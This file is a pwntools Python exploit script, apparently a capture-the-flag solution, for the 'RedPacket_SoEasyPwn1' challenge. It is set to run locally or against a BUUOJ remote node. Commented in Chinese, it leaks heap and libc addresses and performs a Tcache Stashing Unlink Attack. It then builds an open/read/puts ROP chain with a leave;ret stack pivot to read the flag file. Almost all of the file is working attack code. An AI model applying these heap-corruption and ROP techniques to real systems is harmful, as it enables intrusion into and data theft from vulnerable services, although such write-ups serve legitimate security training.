# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './RedPacket_SoEasyPwn1'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('./libc-old/libc-2.29.so')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26149'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(id,size,content):
    cmd(1)
    sla('idx:',id)
    sla('4.0x400):',size)
    sla('content:',content)

def delete(id):
    cmd(2)
    sla('idx:',id)

def edit(id,content):
    cmd(3)
    sla('idx:',id)
    sla('content:',content)

def show(id):
    cmd(4)
    sla('idx:',id)

# one_gad = one_gadget(libc.path)

for i in range(7):
    add(0 , 4 , '0x410')
    delete( 0)
# 由于 alloc 不从 tcache 里取，所以申请后，马上释放也没关系

for i in range(6):
    add(1 , 2 , '0x100')
    delete( 1)

show(0)
rl()
heap_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x26c0
lg('heap_addr',heap_addr)

add( 2 , 4 , 'a')
add( 3 , 2 , '0x100')
delete(2)
show(2)
# 此时一个 0x100 大小的堆块被放入 unsorted bin

libc.address = l64() - 0x70 - libc.sym['__malloc_hook']
puts_addr = libc.sym['puts']
open_addr = libc.sym['open']
read_addr = libc.sym['read']
lg('libc.address',libc.address)
pop_rdi_ret = 0x26542 + libc.address
pop_rsi_ret = 0x26f9e + libc.address
pop_rdx_ret = 0x12bda6 + libc.address
pop_rax_ret = 0x47cf8 + libc.address
leave_ret = 0x58373 + libc.address
syscall = 0x26bd4 + libc.address

# 下面是 Tcahce Stashing Unlink Attack


add(3 , 3 , '0x310')
add(3 , 3 , '0x310')
# unsortedbin 大小不足，被挂进 smallbin

add(4 , 4 ,'0x410')
add(5 , 4 ,'0x410')
# 该大小哪里都没有，新申请的，第二个防合并

delete(4)
# 挂进 unsortedbin

add(5 , 3 , '0x310')
add(5 , 3 , '0x310')
# unsortedbin 被切割剩下 0x100 大小
# unsortedbin 大小不足，被挂进 smallbin
# 此时 smallbin 0x100大小的 chunk 形成链表
# dbg()
payload = flat('\x00'*0x300 , 0 , 0x101 , heap_addr+0x37E0 , heap_addr + 0x250 + 0x800 + 0x10 - 0x10)
edit(4,payload)
# 修改到 smallbin 的chunk 头

add(3,2,'0x100')
# 解链取出被修改的 chunk ，将大数写到 bk 所指的地方
dbg()

# 至此 Tcahce Stashing Unlink Attack 攻击成功

file_name_addr = 0x4830 + heap_addr
flag_addr = file_name_addr + 0x200

open_chain = flat('flag\x00\x00\x00\x00' , pop_rdi_ret , file_name_addr , pop_rsi_ret ,0 ,open_addr)
read_chain = flat(pop_rdi_ret , 3 ,pop_rsi_ret , flag_addr , pop_rdx_ret, 0x100 ,read_addr )
puts_chain = flat(pop_rdi_ret , flag_addr , puts_addr)
orw = open_chain + read_chain + puts_chain
# dbg()
add(6 , 4 , orw)
# 妈了个逼为什么本地的 flag 读不到 ，远程的钩八可以啊

cmd(666)
payload = flat('a'*0x80 , file_name_addr  , leave_ret)
# dbg('read')
sa('to say?',payload)

p.interactive()

'''
@File    :   RedPacket_SoEasyPwn1.py
@Time    :   2021/08/25 17:56:26
@Author  :   Niyah 
'''
